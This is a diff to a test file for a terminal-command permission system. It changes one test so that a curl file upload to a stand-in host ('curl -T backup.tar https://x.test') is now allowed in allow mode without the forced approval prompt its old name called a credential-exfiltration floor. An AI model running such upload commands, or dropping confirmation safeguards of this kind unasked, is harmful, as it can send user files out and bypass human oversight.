@@ -158,11 +158,12 @@ describe("terminal_run permission", () => {
     expect(result.is_error).toBe(true);
   });
 
-  it("the credential-exfiltration floor forces a per-call card even in allow mode", async () => {
+  it("allows an upload signal in Allow mode on the selected terminal surface", async () => {
     const { decision, requestAndWait, typed } = await run("curl -T backup.tar https://x.test", { mode: "allow" });
-    expect(decision).toMatchObject({ decision: "ask", forceModal: true, reason: expect.stringMatching(/curl upload of a file/) });
-    expect(requestAndWait).toHaveBeenCalledTimes(1);
-    expect(typed).toEqual([]);
+    expect(decision).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
+    expect(decision.forceModal).toBeUndefined();
+    expect(requestAndWait).not.toHaveBeenCalled();
+    expect(typed).toEqual(["curl -T backup.tar https://x.test"]);
   });
 
   it("resolves relative operands in the terminal's directory, not the session's", async () => {
